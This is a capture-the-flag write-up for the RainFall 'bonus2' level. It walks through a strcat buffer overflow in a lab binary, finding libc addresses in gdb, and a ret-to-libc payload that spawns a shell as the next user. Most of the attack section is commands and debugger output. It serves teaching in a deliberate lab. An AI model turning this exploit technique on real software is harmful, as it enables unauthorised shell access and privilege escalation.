## Flag Bonus2 README: Finding Flag Bonus2

After connection on our vm with:
```bash
ssh bonus2@localhost -p 4343
```

We found a binary named bonus2. When we run it we obtain:
```sh
bonus2@RainFall:~$ ./bonus2
Segmentation fault (core dumped)
bonus2@RainFall:~$
```

Okay next step, decompile this program in order to understand what's the purpose and how to exploit it.

As you can see in our file [source](../source), there is `main` and `greetuser`.
greatuser doest somthing easy, it just write specyfic message regarding the value of language into dest and add the first arg into the string then it writes it on STDOUT with puts.
Main is just for seeking the langage of the user.

So, our plan is to use `strcat` for a `buffer overflow` to do a `ret to libc`

Okay, as always, we have our receipe, now let's cook.

First let's try to find adresses of `system`, `exit` and `/bin/sh`.

```sh
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r
Starting program: /home/user/bonus2/bonus2 

Breakpoint 1, 0x0804852f in main ()
(gdb) p system
$3 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$4 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

Sum up:
- `system`: `0xb7e6b060`
- `exit`: `0xb7e5ebe0`
- `/bin/sh`: `0xb7f8cc58`

Okay we have our adresses. Next is to change the language cause when we find our payload, our lang was in fi.

```sh
export LANG=fi
```

After this, we need to find in witch address we need to overwrite.

So we try our best string

```sh
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09eA00eA01eA02eA03eA04eA05eA06eA07eA08eA09fA00fA01fA02fA03fA04fA05fA06fA07fA08fA09gA00gA01gA02gA03
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09eA00eA01eA02eA03eA04eA05eA06eA07eA08eA09fA00fA01fA02fA03fA04fA05fA06fA07fA08fA09gA00gA01gA02gA03
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaA00aA01aA02aA03aA04aA05aA06aA07

Program received signal SIGSEGV, Segmentation fault.
0x41613430 in ?? ()
```

Okay so our adress value is: `0x41613430` which is `Aa40` but we are in little indien so the true value is: `04aA`

So we need to create a value of `18 bytes` plus our payload.

Okay let's make it !

`PAYLOAD = ./exec + argument1 + $(python -c 'print((random char * 18) +  + (address of system) + (address of exit) + (address of /bin/sh)')`

so the command to send is:

```sh
bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA $(python -c 'print("\x90"*18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������������������`�����X���
$ whoami
bonus3
```

